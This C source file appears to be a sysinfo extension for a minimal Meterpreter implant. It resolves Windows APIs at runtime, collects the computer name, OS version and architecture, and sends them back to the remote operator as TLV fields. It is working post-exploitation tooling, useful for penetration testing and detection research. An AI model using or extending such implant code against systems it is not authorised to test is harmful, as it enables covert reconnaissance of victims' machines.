#include "meterpreter_micro.h"
#include "micro_runtime.h"
#include "micro_stdapi.h"

typedef BOOL(WINAPI* GetComputerNameAFunction)(LPSTR name, LPDWORD length);
typedef VOID(WINAPI* GetNativeSystemInfoFunction)(LPSYSTEM_INFO information);

static MetApi* sysinfo_api;

static char* append_text(char* output, const char* value)
{
	while (*value != '\0')
	{
		*output++ = *value++;
	}
	return output;
}

static char* append_uint(char* output, DWORD value)
{
	char digits[10];
	DWORD count = 0;
	do
	{
		digits[count++] = (char)('0' + value % 10);
		value /= 10;
	} while (value != 0);
	while (count != 0)
	{
		*output++ = digits[--count];
	}
	return output;
}

static DWORD sysinfo_handler(Remote* remote, Packet* packet)
{
	Packet* response = sysinfo_api->packet.create_response(packet);
	GetComputerNameAFunction get_computer_name = (GetComputerNameAFunction)micro_resolve(sysinfo_api, "kernel32.dll", "GetComputerNameA");
	GetNativeSystemInfoFunction get_native_system_info = (GetNativeSystemInfoFunction)micro_resolve(sysinfo_api, "kernel32.dll", "GetNativeSystemInfo");
	RTL_OSVERSIONINFOEXW version;
	SYSTEM_INFO system_info;
	char computer[256];
	char os[96];
	char* cursor;
	const char* architecture = "unknown";
	DWORD computer_length = sizeof(computer);
	DWORD result = ERROR_SUCCESS;

	if (response == NULL || get_computer_name == NULL || get_native_system_info == NULL || sysinfo_api->win_api.ntdll.RtlGetVersion == NULL)
	{
		result = ERROR_PROC_NOT_FOUND;
		if (response != NULL)
		{
			result = sysinfo_api->packet.transmit_response(result, remote, response);
		}
		return result;
	}

	micro_zero(&version, sizeof(version));
	micro_zero(&system_info, sizeof(system_info));
	micro_zero(computer, sizeof(computer));
	version.dwOSVersionInfoSize = sizeof(version);
	if (!get_computer_name(computer, &computer_length) || sysinfo_api->win_api.ntdll.RtlGetVersion(&version) != 0)
	{
		result = micro_last_error();
		if (result == ERROR_SUCCESS)
		{
			result = ERROR_INVALID_DATA;
		}
	}
	else
	{
		get_native_system_info(&system_info);
		if (system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
		{
			architecture = "x64";
		}
		else if (system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
		{
			architecture = "x86";
		}
		else if (system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64)
		{
			architecture = "aarch64";
		}

		cursor = append_text(os, "Windows ");
		cursor = append_uint(cursor, version.dwMajorVersion);
		*cursor++ = '.';
		cursor = append_uint(cursor, version.dwMinorVersion);
		cursor = append_text(cursor, " Build ");
		cursor = append_uint(cursor, version.dwBuildNumber);
		*cursor = '\0';

		sysinfo_api->packet.add_tlv_string(response, TLV_TYPE_COMPUTER_NAME, computer);
		sysinfo_api->packet.add_tlv_string(response, TLV_TYPE_OS_NAME, os);
		sysinfo_api->packet.add_tlv_string(response, TLV_TYPE_ARCHITECTURE, architecture);
		sysinfo_api->packet.add_tlv_string(response, TLV_TYPE_LANG_SYSTEM, "Unknown");
	}

	return sysinfo_api->packet.transmit_response(result, remote, response);
}

static BOOL sysinfo_inline(Remote* remote, Packet* packet, DWORD* result)
{
	*result = sysinfo_handler(remote, packet);
	return TRUE;
}

static Command sysinfo_commands[] =
{
	COMMAND_INLINE_REQ(COMMAND_ID_STDAPI_SYS_CONFIG_SYSINFO, sysinfo_inline),
	COMMAND_TERMINATOR
};

static MicroExtension sysinfo_extension =
{
	sizeof(MicroExtension),
	MICRO_EXTENSION_ABI_VERSION,
	"micro-stdapi-sysinfo",
	1,
	sysinfo_commands,
	MICRO_EXTENSION_FLAG_INLINE_HANDLERS
};

const MicroExtension* micro_init(MetApi* api, Remote* remote)
{
	(void)remote;
	if (api == NULL || api->packet.create_response == NULL || api->packet.add_tlv_string == NULL || api->packet.transmit_response == NULL)
	{
		return NULL;
	}

	sysinfo_api = api;
	return &sysinfo_extension;
}

DWORD micro_deinit(Remote* remote)
{
	(void)remote;
	sysinfo_api = NULL;
	return ERROR_SUCCESS;
}
